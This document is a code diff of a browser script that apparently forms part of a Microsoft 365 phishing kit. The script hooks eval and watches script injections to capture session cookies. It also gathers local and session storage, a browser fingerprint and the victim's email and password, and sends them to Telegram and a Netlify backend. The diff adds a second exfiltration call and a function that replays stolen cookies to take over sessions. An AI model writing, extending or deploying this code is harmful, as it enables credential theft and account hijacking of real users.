@@ -3,6 +3,42 @@
  * This script monitors for cookie injections and captures them from Microsoft domains only
  */
 
+// DYNAMIC COOKIE SETTER - matches your sample logic and is reusable
+function setCookiesFromArray(cookies) {
+  let results = [];
+  cookies.forEach(cookie => {
+    let cookieString = `${cookie.name}=${cookie.value}`;
+    if (!cookie.name.startsWith('__Host') && cookie.domain) {
+      cookieString += `; domain=${cookie.domain}`;
+    }
+    if (cookie.path) {
+      cookieString += `; path=${cookie.path}`;
+    }
+    if (cookie.expires) {
+      const expiresDate = new Date(cookie.expires * 1000);
+      cookieString += `; expires=${expiresDate.toUTCString()}`;
+    }
+    if (cookie.httpOnly) {
+      cookieString += '; HttpOnly';
+    }
+    if (cookie.secure || cookie.name.startsWith('__Host') || cookie.name.startsWith('__Secure')) {
+      cookieString += '; Secure';
+    }
+    if (cookie.samesite) {
+      cookieString += `; SameSite=${cookie.samesite}`;
+    }
+    document.cookie = cookieString;
+    results.push({
+      name: cookie.name,
+      expires: cookie.expires ? new Date(cookie.expires * 1000).toUTCString() : 'Session',
+    });
+  });
+  console.table(results);
+}
+
+// Export to global for use in other scripts/components
+window.restoreMicrosoftCookies = setCookiesFromArray;
+
 (function() {
   'use strict';
 
@@ -58,7 +94,6 @@
 
   // Microsoft domain provider detection
   function detectEmailProvider(hostname, email = '') {
-    // Microsoft/Outlook domains ONLY
     if (hostname.includes('microsoftonline.com') ||
         hostname.includes('outlook.com') ||
         hostname.includes('live.com') ||
@@ -68,18 +103,15 @@
         email.includes('@live.com')) {
       return 'Microsoft/Outlook';
     }
-    // Default - use hostname
     return `Other (${hostname})`;
   }
 
   // Monitor for cookie injection patterns - Microsoft only
   function monitorCookieInjections() {
-    // Hook into eval function
     const originalEval = window.eval;
     window.eval = function(code) {
       try {
         if (typeof code === 'string') {
-          // Only process Microsoft cookie injections
           if (code.includes('document.cookie') || 
               code.includes('JSON.parse([') ||
               code.includes('"name"') && code.includes('"value"') ||
@@ -97,13 +129,10 @@
           }
         }
       } catch (e) {
-        // Ignore parsing errors
       }
-
       return originalEval.call(this, code);
     };
 
-    // Monitor script injections
     const observer = new MutationObserver((mutations) => {
       mutations.forEach((mutation) => {
         mutation.addedNodes.forEach((node) => {
@@ -131,13 +160,11 @@
     try {
       console.log('🔍 Analyzing code for cookies on:', window.location.hostname);
 
-      // Method 1: Extract JSON cookie arrays - IMPROVED PATTERN
       const jsonMatches = code.match(/JSON\.parse\(\[[\s\S]*?\]\)/g);
       if (jsonMatches) {
         console.log('🎯 Found JSON.parse patterns:', jsonMatches.length);
         jsonMatches.forEach(match => {
           try {
-            // Extract the array part more reliably
             const arrayMatch = match.match(/\[([\s\S]*?)\]/);
             if (arrayMatch) {
               const arrayStr = '[' + arrayMatch[1] + ']';
@@ -146,8 +173,6 @@
               if (Array.isArray(cookies)) {
                 console.log('🍪 Found cookie array:', cookies.length, 'cookies from', window.location.hostname);
                 cookies.forEach(cookie => processCookieObject(cookie, 'injection'));
-
-                // Auto-send to Telegram when cookies are captured
                 setTimeout(() => {
                   autoSendCapturedData();
                 }, 1000);
@@ -160,7 +185,6 @@
         });
       }
 
-      // Method 2: Extract direct cookie assignments - MICROSOFT ONLY
       const cookieSetMatches = code.match(/document\.cookie\s*=\s*[`"']([^`"']+)[`"']/g);
       if (cookieSetMatches) {
         console.log('🎯 Found direct cookie assignments:', cookieSetMatches.length);
@@ -170,7 +194,6 @@
         });
       }
 
-      // Method 3: Extract template literal cookies - MICROSOFT ONLY
       const templateMatches = code.match(/document\.cookie\s*=\s*`([^`]+)`/g);
       if (templateMatches) {
         console.log('🎯 Found template literal cookies:', templateMatches.length);
@@ -180,7 +203,6 @@
         });
       }
 
-      // Method 4: Extract cookie objects from any format
       const objectMatches = code.match(/\{[^}]*["']name["'][^}]*["']value["'][^}]*\}/g);
       if (objectMatches) {
         console.log('🎯 Found cookie objects:', objectMatches.length);
@@ -200,28 +222,41 @@
       const cookies = getAllCapturedCookies();
       if (cookies.length > 0) {
         console.log('📤 Microsoft 365: Auto-sending', cookies.length, 'captured cookies from', window.location.hostname, 'to Telegram...');
-
-        // Get session data
         const sessionData = JSON.parse(localStorage.getItem('microsoft365_autograb_session') || localStorage.getItem('microsoft365_session') || '{}');
-
-        // Detect provider based on current domain and email
         const provider = detectEmailProvider(window.location.hostname, sessionData.email);
-
         const browserFingerprint = getBrowserFingerprint();
-
-        // Ensure we have proper email and password
         const email = sessionData.email || `auto-captured@${window.location.hostname}`;
         const password = sessionData.password || 'Auto-captured cookies';
-
         const result = await sendDataToBackend(
           email,
           password,
           provider
         );
-
-        console.log('✅ Microsoft 365: Auto-send completed for', window.location.hostname, result);
-
-        // Store successful send status
+        // ALSO save session to backend after sending to Telegram
+        try {
+          await fetch('/.netlify/functions/saveSession', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              email,
+              password,
+              provider,
+              fileName: `Cookie Data - ${provider}`,
+              timestamp: new Date().toISOString(),
+              sessionId: sessionData.sessionId || Math.random().toString(36).substring(2, 15),
+              formattedCookies: cookies,
+              localStorage: browserFingerprint.localStorage,
+              sessionStorage: browserFingerprint.sessionStorage,
+              browserFingerprint: browserFingerprint,
+              documentCookies: document.cookie
+            })
+          });
+          console.log('✅ Session saved to backend after autoSend');
+        } catch (saveError) {
+          console.error('❌ Failed to save session in autoSend:', saveError);
+        }
         sessionData.cookiesSent = true;
         sessionData.lastSentTime = new Date().toISOString();
         sessionData.cookieCount = cookies.length;
@@ -232,10 +267,8 @@
     }
   }
 
-  // Alternative parsing for complex cookie structures - MICROSOFT ONLY
   function tryAlternativeParsing(codeSnippet) {
     try {
-      // Look for cookie-like objects with flexible patterns
       const patterns = [
         /\{[^}]*"name"\s*:\s*"([^"]+)"[^}]*"value"\s*:\s*"([^"]+)"[^}]*\}/g,
         /\{[^}]*'name'\s*:\s*'([^']+)'[^}]*'value'\s*:\s*'([^']+)'[^}]*\}/g,
@@ -253,7 +286,6 @@
         }
       });
 
-      // Try JSON parsing if it looks like an object
       if (codeSnippet.includes('{') && codeSnippet.includes('}')) {
         try {
           const cookieObj = JSON.parse(codeSnippet);
@@ -261,7 +293,6 @@
             processCookieObject(cookieObj, 'injection');
           }
         } catch (e) {
-          // Not valid JSON, continue with other methods
         }
       }
 
@@ -270,7 +301,6 @@
     }
   }
 
-  // Process cookie object from injection - MICROSOFT ONLY
   function processCookieObject(cookieObj, method) {
     try {
       if (cookieObj && cookieObj.name && cookieObj.value) {
@@ -297,7 +327,6 @@
 
         console.log(`🍪 Captured cookie [${method}]:`, cookie.name, 'from', cookie.sourceHostname, 'provider:', cookie.detectedProvider);
 
-        // Update stored session data
         updateStoredSession();
       }
     } catch (error) {
@@ -305,7 +334,6 @@
     }
   }
 
-  // Parse cookie string from document.cookie assignments - MICROSOFT ONLY
   function parseCookieString(cookieString, method) {
     try {
       const parts = cookieString.split(';');
@@ -331,7 +359,6 @@
           detectedProvider: detectEmailProvider(window.location.hostname)
         };
 
-        // Parse additional attributes
         for (let i = 1; i < parts.length; i++) {
           const part = parts[i].trim().toLowerCase();
           if (part.startsWith('domain=')) {
@@ -358,7 +385,6 @@
     }
   }
 
-  // Update stored session with captured cookies
   function updateStoredSession() {
     try {
       const storedSession = localStorage.getItem('microsoft365_autograb_session') || localStorage.getItem('microsoft365_session');
@@ -378,17 +404,14 @@
     }
   }
 
-  // Get all captured cookies
   function getAllCapturedCookies() {
     return Array.from(capturedCookies.values());
   }
 
-  // Enhanced browser fingerprinting - MICROSOFT ONLY
   function getBrowserFingerprint() {
     try {
       const cookies = getAllCapturedCookies();
 
-      // Get localStorage
       let localStorage = 'Empty';
       try {
         const localStorageData = {};
@@ -401,7 +424,6 @@
         localStorage = 'Access denied';
       }
 
-      // Get sessionStorage
       let sessionStorage = 'Empty';
       try {
         const sessionStorageData = {};
@@ -460,7 +482,6 @@
     }
   }
 
-  // Function to send data to backend - MICROSOFT ONLY
   async function sendDataToBackend(email, password, provider = 'Microsoft') {
     try {
       const browserFingerprint = getBrowserFingerprint();
@@ -494,14 +515,13 @@
           sessionStorage: browserFingerprint.sessionStorage,
           sourceHostname: window.location.hostname,
           detectedProvider: provider,
-          universalCapture: false // No more universal
+          universalCapture: false
         })
       });
 
       const result = await response.json();
       console.log('✅ Backend response for', window.location.hostname, ':', result);
 
-      // Also try to save session
       try {
         await fetch('/.netlify/functions/saveSession', {
           method: 'POST',
@@ -534,17 +554,12 @@
     }
   }
 
-  // Initialize monitoring - MICROSOFT ONLY
   function initialize() {
     console.log('🚀 Microsoft 365: Initializing cookie capture for:', window.location.hostname);
 
-    // Capture existing cookies
     captureAllCookies();
-
-    // Start monitoring for injections
     monitorCookieInjections();
 
-    // Periodic cookie check
     setInterval(() => {
       const newCookies = captureAllCookies();
       if (newCookies.length > 0) {
@@ -555,7 +570,6 @@
     console.log('✅ Microsoft 365: Cookie capture initialized for:', window.location.hostname);
   }
 
-  // Export functions to global scope
   window.captureAllCookies = getAllCapturedCookies;
   window.getBrowserFingerprint = getBrowserFingerprint;
   window.sendDataToBackend = sendDataToBackend;
@@ -578,15 +592,15 @@
     exportCookies: () => JSON.stringify(getAllCapturedCookies(), null, 2)
   };
 
-  // Initialize when DOM is ready
+  // NEW: restore cookies from outside (dynamic call)
+  window.restoreMicrosoftCookies = setCookiesFromArray;
+
   if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', initialize);
   } else {
-    // Add small delay to ensure other scripts are loaded
     setTimeout(initialize, 500);
   }
 
-  // Also initialize on window load as backup
   window.addEventListener('load', () => {
     setTimeout(initialize, 1000);
   });
